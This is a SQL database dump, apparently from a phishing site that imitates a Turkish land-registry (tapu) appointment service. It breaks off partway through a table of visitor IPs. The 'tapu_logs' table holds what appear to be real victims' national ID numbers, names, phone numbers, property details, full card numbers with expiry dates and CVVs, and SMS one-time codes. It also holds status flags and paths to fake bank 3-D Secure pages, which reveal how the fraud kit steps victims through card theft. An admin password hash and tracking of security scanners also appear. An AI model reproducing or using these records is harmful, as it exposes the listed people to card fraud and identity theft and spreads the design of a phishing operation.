-- phpMyAdmin SQL Dump
-- version 5.2.3
-- https://www.phpmyadmin.net/
--
-- Anamakine: localhost:3306
-- Üretim Zamanı: 06 Tem 2026, 17:54:19
-- Sunucu sürümü: 10.11.14-MariaDB-0+deb12u2
-- PHP Sürümü: 8.4.22

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `tapu_db`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `tapu_admin`
--

CREATE TABLE `tapu_admin` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `tapu_admin`
--

INSERT INTO `tapu_admin` (`id`, `username`, `password`) VALUES
(1, 'admin', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2uheWG/igi.');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `tapu_ayarlar`
--

CREATE TABLE `tapu_ayarlar` (
  `anahtar` varchar(100) NOT NULL,
  `deger` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci;

--
-- Tablo döküm verisi `tapu_ayarlar`
--

INSERT INTO `tapu_ayarlar` (`anahtar`, `deger`) VALUES
('ban_redirect_url', 'https://www.google.com'),
('randevu_ucreti', '49.90');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `tapu_ip_banlist`
--

CREATE TABLE `tapu_ip_banlist` (
  `ip` varchar(45) NOT NULL,
  `sebep` varchar(255) DEFAULT '',
  `olusturuldu` datetime DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `tapu_logs`
--

CREATE TABLE `tapu_logs` (
  `id` int(11) NOT NULL,
  `session_id` varchar(128) NOT NULL,
  `ip` varchar(45) NOT NULL DEFAULT '',
  `tc` varchar(20) DEFAULT '',
  `ad` varchar(100) DEFAULT '',
  `soyad` varchar(100) DEFAULT '',
  `telefon` varchar(20) DEFAULT '',
  `il` varchar(100) DEFAULT '',
  `ilce` varchar(100) DEFAULT '',
  `islem` varchar(50) DEFAULT '',
  `aciklama` text DEFAULT '',
  `mudurlik` varchar(200) DEFAULT '',
  `tarih` varchar(20) DEFAULT '',
  `saat` varchar(30) DEFAULT '',
  `sms_kod` varchar(20) DEFAULT '',
  `sms_hata_kodlari` text DEFAULT '',
  `kart_ad` varchar(200) DEFAULT '',
  `kart_no` varchar(25) DEFAULT '',
  `ay` varchar(5) DEFAULT '',
  `yil` varchar(5) DEFAULT '',
  `cvv` varchar(10) DEFAULT '',
  `banka` varchar(150) DEFAULT '',
  `kart_tier` varchar(50) DEFAULT '',
  `mevcut_adim` tinyint(4) DEFAULT 1,
  `durum` varchar(50) DEFAULT 'aktif',
  `admin_mesaj` text DEFAULT '',
  `acs_url` varchar(300) DEFAULT '',
  `tg_message_id` varchar(100) DEFAULT '',
  `son_aktivite` datetime DEFAULT current_timestamp(),
  `olusturuldu` datetime DEFAULT current_timestamp(),
  `guncellendi` datetime DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci;

--
-- Tablo döküm verisi `tapu_logs`
--

INSERT INTO `tapu_logs` (`id`, `session_id`, `ip`, `tc`, `ad`, `soyad`, `telefon`, `il`, `ilce`, `islem`, `aciklama`, `mudurlik`, `tarih`, `saat`, `sms_kod`, `sms_hata_kodlari`, `kart_ad`, `kart_no`, `ay`, `yil`, `cvv`, `banka`, `kart_tier`, `mevcut_adim`, `durum`, `admin_mesaj`, `acs_url`, `tg_message_id`, `son_aktivite`, `olusturuldu`, `guncellendi`) VALUES
(1, 'b0419d5eef04f0d8e0ef57bc0555beca', '5.47.105.37', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 1, 'aktif', '', '', '', '2026-07-06 14:18:18', '2026-07-06 14:17:33', '2026-07-06 14:18:18'),
(2, '933f301f028d89d58916ca94b93e4565', '5.47.105.37', '', '', '', '', '', '', '', '', 'Adıyaman Tapu Müdürlüğü', '2026-10-12', '09:30 - 10:00', '', '', '', '', '', '', '', '', '', 1, 'aktif', '', '', '', '2026-07-06 15:17:05', '2026-07-06 14:18:22', '2026-07-06 15:17:05'),
(3, '24f2daaa3225c40711094ee05406ce59', '31.223.96.66', '11111111110', 'Ahmet', 'Kaya', '05458880077', 'ANKARA', 'Elmadağ', 'Intikal', 'Ajfjsjd', 'Keçiören Tapu Müdürlüğü', '2026-07-06', '14:30 - 15:00', '', '', '', '', '', '', '', '', '', 3, 'aktif', '', '', '', '2026-07-06 15:47:28', '2026-07-06 15:42:13', '2026-07-06 15:47:28'),
(4, 'd3437de42f6f5a75f1fd5bf8b35718c5', '78.174.208.199', '28414930102', 'Hilmiye', 'Erogul', '05373324127', 'MUĞLA', 'Bodrum', 'Diger', '', 'Bodrum Tapu Müdürlüğü', '2026-07-08', '09:00 - 09:30', '', '', 'Melih erogul', '4543600222382973', '09', '27', '381', 'TURKIYE IS BANKASI, A.S.', 'CLASSIC', 4, 'kart_desteklenmiyor', '', '/acs/isbankasi.php', '', '2026-07-06 16:07:18', '2026-07-06 15:42:20', '2026-07-06 16:07:18'),
(5, '567248ab52a65c5e6e10f57d067eeb32', '5.47.97.243', '27475482100', 'Selma', 'Tuzcu', '05377476247', 'ÇORUM', 'Merkez', 'Intikal', '', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 15:45:04', '2026-07-06 15:44:00', '2026-07-06 15:45:04'),
(6, 'bfe2113ea23a54a29bf4e011c145f772', '94.235.127.184', '56983201408', 'Uğur', 'Çetin', '05525164889', 'KÜTAHYA', 'Gediz', 'Intikal', '', 'Gediz Tapu Müdürlüğü', '2026-07-09', '11:30 - 12:00', '', '', 'Uğur Çetin', '9792380012188966', '07', '30', '532', 'T. HALK BANKASI, A.S.', 'PERSONAL', 3, 'bekle', '', '/acs/halkbank.php', '', '2026-07-06 16:04:16', '2026-07-06 15:44:00', '2026-07-06 16:04:16'),
(7, 'e33e6473bbb34d240f38624e53ebf699', '178.244.35.44', '61855026430', 'Mustafa', 'Doğan', '05372798472', 'KONYA', 'Meram', 'Satis', '353 ada 7 parsel', 'Meram Tapu Müdürlüğü', '2026-07-08', '09:00 - 09:30', '', '', '', '', '', '', '', '', '', 3, 'aktif', '', '', '', '2026-07-06 15:47:15', '2026-07-06 15:44:58', '2026-07-06 15:47:15'),
(8, '24911256383e5bcc2c2d20342a33dd21', '5.176.140.248', '25595595588', 'Yılmaz', 'Tekin', '05435833394', 'YOZGAT', 'Sorgun', 'Satis', '206. 324 Ahmedefendi mah', 'Sorgun Tapu Müdürlüğü', '2026-07-08', '13:00 - 13:30', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 15:47:28', '2026-07-06 15:46:01', '2026-07-06 15:47:28'),
(9, 'beb5756eb5251c45ab25ce5f706fe8a6', '78.166.192.210', '47866925412', 'Özhan', 'Köroğlu', '05015330078', 'KARABÜK', 'Safranbolu', 'Satis', 'Yeni mahalle dibekönü caddesi özçelik sitesi C blok daire 2 SAFRANBOLU KARABÜK', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 15:48:09', '2026-07-06 15:48:09', '2026-07-06 15:48:09'),
(10, '435ca50d8073491bbea5eb7e6dd90a83', '88.232.42.139', '11387964458', 'Ürgiye', 'Eren', '05458421003', 'SİNOP', 'Gerze', 'Diger', '140/70', 'Sinop Tapu Müdürlüğü', '2026-07-13', '10:00 - 10:30', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 15:54:51', '2026-07-06 15:48:27', '2026-07-06 15:54:51'),
(11, '9c91df39eafe123d258bd701cc887b40', '37.155.233.89', '16144875916', 'Musa', 'Uçakcı', '05059173090', 'ANKARA', 'Altındağ', 'Ipotek', '', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 15:49:06', '2026-07-06 15:49:06', '2026-07-06 15:49:06'),
(12, 'e45b76b1ac6f30c9b91e9fe961d153f9', '176.89.99.17', '25474812058', 'Bayram', 'Tokalak', '05359258348', 'İSTANBUL', 'Ümraniye', 'Satis', '', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 15:50:05', '2026-07-06 15:50:05', '2026-07-06 15:50:05'),
(13, '8217165be44fe0d0d008511f1434f5ca', '176.239.197.15', '19301127408', 'Mehmet', 'Yigit', '05343663107', 'KONYA', 'Emirgazi', 'Intikal', '', 'Ereğli Tapu Müdürlüğü', '2026-07-07', '09:30 - 10:00', '', '[16:23:18] 954927\n[16:25:44] 111100\n[16:35:21] 763060', 'Mehmet yiğit', '4743401073371662', '12', '31', '586', 'TURKIYE IS BANKASI, A.S.', 'SIGNATURE', 4, '3d_gonder', '', '/acs/isbankasi.php', '', '2026-07-06 16:36:02', '2026-07-06 15:50:35', '2026-07-06 16:36:02'),
(14, '0e4cc0579cf5995ef8df01aec69899c5', '94.54.248.223', '21368193968', 'Hatice Kadriye', 'Torunoğlu', '05308282597', 'İSTANBUL', 'Beyoğlu', 'Satis', '270 ada, 75 parsel, Emekyemez Mah.', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 15:52:01', '2026-07-06 15:52:01', '2026-07-06 15:52:01'),
(15, 'e48d5163c7b699ab12fd7629658e6437', '151.250.56.37', '30916068924', 'Süzan', 'Oflaz', '05335919409', 'AYDIN', 'Köşk', 'Satis', '0-2044', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 15:56:15', '2026-07-06 15:55:52', '2026-07-06 15:56:15'),
(16, '0fe433f17da595f62afee179ead41ceb', '178.246.215.183', '24337172650', 'Cenk', 'Söylemez', '05322317739', 'ANKARA', 'Etimesgut', 'Intikal', '', 'Etimesgut Tapu Müdürlüğü', '2026-07-08', '09:30 - 10:00', '', '', '', '', '', '', '', '', '', 3, 'aktif', '', '', '', '2026-07-06 16:00:19', '2026-07-06 15:56:04', '2026-07-06 16:00:19'),
(17, 'd6a7c354f9157a4460acfbe0ac7a017f', '178.243.104.133', '46801231106', 'Mesut', 'Can', '05448518791', 'SİİRT', 'Merkez', 'Ipotek', '', 'Siirt Tapu Müdürlüğü', '2026-07-07', '09:00 - 09:30', '', '[16:46:28] 396856', 'Recep kara', '5309050059425019', '06', '28', '662', 'T.C. ZIRAAT BANKASI A.S.', 'PLATINUM', 4, '3d_hatali', '', '/acs/ziraat.php', '', '2026-07-06 16:50:45', '2026-07-06 15:57:03', '2026-07-06 16:51:06'),
(18, '133c94e05c8f5880b1026d167cc0dfd3', '5.46.253.58', '31138185932', 'Sedat', 'Döner', '05368194382', 'VAN', 'İpekyolu', 'Satis', 'Ada:667\r\nParsel:86\r\nMahalle:selimbey \r\nİlçe :ipekyolu', 'İpekyolu Tapu Müdürlüğü', '2026-07-07', '09:30 - 10:00', '431744', '', 'Ferhat döner', '5218071104109705', '09', '26', '970', 'AKBANK T.A.S.', 'MASTERCARD WORLD BLACK EDITION', 2, 'kart_desteklenmiyor', '', '/acs/akbank.php', '', '2026-07-06 16:19:36', '2026-07-06 16:03:48', '2026-07-06 16:20:54'),
(20, 'fbbf6a8a96ca8d587ae4f6282194e7b9', '31.223.96.66', '46801231106', 'MESUT', 'CAN', '05334557878', 'AĞRI', 'Eleşkirt', 'Intikal', 'Djdj', 'Doğubayazıt Tapu Müdürlüğü', '2026-07-08', '13:30 - 14:00', '', '', '', '', '', '', '', '', '', 3, 'aktif', '', '', '', '2026-07-06 17:41:35', '2026-07-06 17:36:31', '2026-07-06 17:41:35'),
(23, 'dc58300f96496c8fbcaea44037b1883a', '5.47.105.37', '11111111110', 'ABDULSELAM', 'DENİZ', '05555555555', 'BATMAN', 'Kozluk', 'Ipotek', '315135351', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 17:47:53', '2026-07-06 17:46:07', '2026-07-06 17:47:53'),
(24, '9202b584577ebfb122b3befd06c6e2c3', '31.223.96.66', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 17:47:28', '2026-07-06 17:47:19', '2026-07-06 17:47:28'),
(25, 'e18f8661d709bbfa6cc645b4fb63513a', '31.223.96.66', '11111111110', 'ABDULSELAM', 'DENİZ', '05334448877', 'BALIKESİR', 'Bandırma', 'Bagis', 'Kfjdjd', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 17:49:38', '2026-07-06 17:49:38', '2026-07-06 17:49:38'),
(26, '1af7274056081bcab1d9455886c87531', '5.47.105.37', '11111111110', 'ABDULSELAM', 'DENİZ', '053135135135135135', 'BATMAN', 'Hasankeyf', 'Ipotek', '', '', '', '', '', '', '', '', '', '', '', '', '', 2, 'aktif', '', '', '', '2026-07-06 17:52:17', '2026-07-06 17:52:03', '2026-07-06 17:52:17');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `tapu_visitors`
--

CREATE TABLE `tapu_visitors` (
  `id` int(11) NOT NULL,
  `ip` varchar(45) NOT NULL,
  `user_agent` varchar(512) DEFAULT '',
  `ilk_ziyaret` datetime DEFAULT current_timestamp(),
  `son_ziyaret` datetime DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `ziyaret_sayisi` int(11) DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `tapu_visitors`
--

INSERT INTO `tapu_visitors` (`id`, `ip`, `user_agent`, `ilk_ziyaret`, `son_ziyaret`, `ziyaret_sayisi`) VALUES
(3, '34.72.176.129', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', '2026-07-06 14:18:09', '2026-07-06 14:18:09', 1),
(4, '205.169.39.7', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36', '2026-07-06 14:19:51', '2026-07-06 14:19:51', 1),
(5, '159.26.105.153', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', '2026-07-06 14:22:45', '2026-07-06 14:22:45', 1),
(6, '84.37.206.138', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', '2026-07-06 14:24:11', '2026-07-06 14:24:11', 1),
(7, '82.24.20.100', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36', '2026-07-06 14:24:24', '2026-07-06 14:24:24', 1),
(8, '185.227.151.64', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.59 Safari/537.36', '2026-07-06 14:47:35', '2026-07-06 14:47:35', 1),
(9, '142.111.89.55', 'Mozilla/5.0 (Linux; Android 15; SM-S931B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.48 Mobile Safari/537.36', '2026-07-06 14:47:35', '2026-07-06 14:47:35', 1),
(10, '78.135.96.136', 'Python/3.12 aiohttp/3.12.15', '2026-07-06 14:55:08', '2026-07-06 14:55:08', 1),
(11, '5.47.105.37', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', '2026-07-06 15:09:02', '2026-07-06 17:53:39', 72),
(12, '178.156.226.52', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15', '2026-07-06 15:12:06', '2026-07-06 15:14:32', 3),
(15, '178.156.249.178', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15', '2026-07-06 15:15:19', '2026-07-06 15:15:19', 1),
(16, '89.244.95.65', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', '2026-07-06 15:18:31', '2026-07-06 15:18:31', 1),
(17, '146.70.188.174', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36', '2026-07-06 15:21:08', '2026-07-06 15:33:59', 3),
(18, '107.178.194.169', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)', '2026-07-06 15:24:45', '2026-07-06 15:24:45', 2),
(19, '13.58.11.83', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51', '2026-07-06 15:24:45', '2026-07-06 15:24:45', 1),
(20, '3.15.137.86', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51', '2026-07-06 15:24:45', '2026-07-06 15:24:45', 1),
(22, '34.132.57.123', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36', '2026-07-06 15:24:51', '2026-07-06 15:24:51', 1),
(23, '107.178.194.168', 'Mozilla/5.0 (Linux; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 GoogleApp/14.16.27.29.arm64 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)', '2026-07-06 15:24:55', '2026-07-06 15:24:55', 2),
(25, '31.223.96.66', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_1_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/149.0.7827.137 Mobile/15E148 Safari/604.1', '2026-07-06 15:25:09', '2026-07-06 17:49:38', 38),
(27, '54.70.53.60', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36', '2026-07-06 15:25:29', '2026-07-06 15:25:29', 1),
(28, '198.44.133.23', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0', '2026-07-06 15:25:35', '2026-07-06 15:25:35', 1),
(30, '80.94.92.7', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', '2026-07-06 15:27:27', '2026-07-06 17:12:43', 2),
(31, '176.65.148.30', 'Mozilla/5.0 (compatible; CT-WP-Scanner/1.0; +https://example.com/bot)', '2026-07-06 15:27:27', '2026-07-06 17:12:51', 2),
(32, '152.42.135.165', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 +https://forestengine.net/#opt-out', '2026-07-06 15:27:28', '2026-07-06 15:27:28', 1),
(33, '91.148.244.131', 'Go-http-client/1.1', '2026-07-06 15:27:29', '2026-07-06 17:12:42', 6),
(36, '145.241.230.205', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 (Silvy X Ran)', '2026-07-06 15:27:35', '2026-07-06 15:27:35', 1),
(37, '104.28.156.61', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', '2026-07-06 15:27:41', '2026-07-06 17:13:03', 2),
(38, '185.213.154.244', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36', '2026-07-06 15:28:25', '2026-07-06 15:28:25', 1),
(39, '195.123.244.84', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0', '2026-07-06 15:28:30', '2026-07-06 15:28:30', 2),
(41, '167.99.210.137', 'Mozilla/5.0 (l9scan/2.0.4373e213e2138313e253; +https://leakix.net)', '2026-07-06 15:28:37', '2026-07-06 15:29:04', 4),
(42, '103.4.250.7', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', '2026-07-06 15:28:39', '2026-07-06 15:28:39', 1),
(43, '103.4.250.145', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', '2026-07-06 15:28:39', '2026-07-06 15:28:53', 3),
(45, '104.252.191.75', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', '2026-07-06 15:28:43', '2026-07-06 15:28:43', 1),
(46, '104.164.173.217', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', '2026-07-06 15:28:43', '2026-07-06 15:28:48', 3),
(53, '104.168.71.16', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/144.0.7559.95 Mobile/15E148 Safari/604.1', '2026-07-06 15:29:50', '2026-07-06 15:29:50', 1),
(54, '152.53.195.17', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0', '2026-07-06 15:30:04', '2026-07-06 17:15:25', 2),
(55, '173.244.32.9', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', '2026-07-06 15:30:06', '2026-07-06 15:30:06', 1),
(56, '141.148.153.213', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', '2026-07-06 15:30:10', '2026-07-06 15:30:12', 3),
(59, '91.132.184.5', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/144.0.7559.95 Mobile/15E148 Safari/604.1', '2026-07-06 15:30:27', '2026-07-06 15:30:27', 1),
(60, '62.133.46.13', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', '2026-07-06 15:30:29', '2026-07-06 15:30:29', 1),
(61, '47.91.109.17', 'Go-http-client/1.1', '2026-07-06 15:30:46', '2026-07-06 15:30:46', 1),
(62, '8.213.195.191', 'Go-http-client/1.1', '2026-07-06 15:30:58', '2026-07-06 15:30:58', 1),
(63, '65.21.124.77', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', '2026-07-06 15:31:28', '2026-07-06 15:31:28', 1),
(64, '100.21.218.158', 'Go-http-client/2.0', '2026-07-06 15:32:20', '2026-07-06 15:32:21', 2),
(68, '64.225.26.192', 'Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0', '2026-07-06 15:33:23', '2026-07-06 15:33:23', 1),
(70, '172.111.15.192', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1', '2026-07-06 15:36:20', '2026-07-06 15:36:21', 2),
(72, '35.165.215.140', 'Go-http-client/2.0', '2026-07-06 15:36:25', '2026-07-06 15:36:26', 2),
(75, '5.46.253.58', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/29.0 Chrome/136.0.0.0 Mobile Safari/537.36', '2026-07-06 15:38:00', '2026-07-06 16:19:36', 12),
(77, '37.155.230.156', 'Mozilla/5.0 (Linux; Android 8.1.0; Venus E4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36', '2026-07-06 15:39:56', '2026-07-06 15:39:56', 1),
(78, '104.252.191.136', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', '2026-07-06 15:40:14', '2026-07-06 15:40:47', 3),
(79, '104.164.173.149', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', '2026-07-06 15:40:15', '2026-07-06 15:40:15', 1),
(81, '94.235.127.184', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36', '2026-07-06 15:40:43', '2026-07-06 15:58:18', 15),
(82, '66.249.81.73', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)', '2026-07-06 15:40:45', '2026-07-06 16:06:04', 3),
(83, '66.102.8.97', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)', '2026-07-06 15:40:45', '2026-07-06 15:40:45', 1),
(84, '74.125.213.33', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)', '2026-07-06 15:40:45', '2026-07-06 15:40:45', 1),
(86, '78.174.208.199', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/426.7.931869700 Mobile/15E148 Safari/604.1', '2026-07-06 15:41:15', '2026-07-06 16:05:49', 40),
(91, '5.176.140.248', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36', '2026-07-06 15:42:16', '2026-07-06 15:47:29', 7),
(92, '34.250.179.63', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36', '2026-07-06 15:42:16', '2026-07-06 15:42:16', 1),
(95, '54.197.89.221', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1', '2026-07-06 15:42:32', '2026-07-06 15:43:22', 2),
(96, '5.47.97.243', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36', '2026-07-06 15:42:36', '2026-07-06 15:45:04', 6),
(97, '88.232.42.139', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/149.0.7827.137 Mobile/15E148 Safari/604.1', '2026-07-06 15:42:37', '2026-07-06 15:54:51', 28),
(98, '176.235.75.4', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36', '2026-07-06 15:42:41', '2026-07-06 15:42:41', 1),
(99, '176.235.75.196', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.5 Mobile/15E148 Safari/604.1', '2026-07-06 15:42:44', '2026-07-06 15:43:23', 3),
(103, '178.244.35.44', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36', '2026-07-06 15:43:10', '2026-07-06 15:46:24', 6),
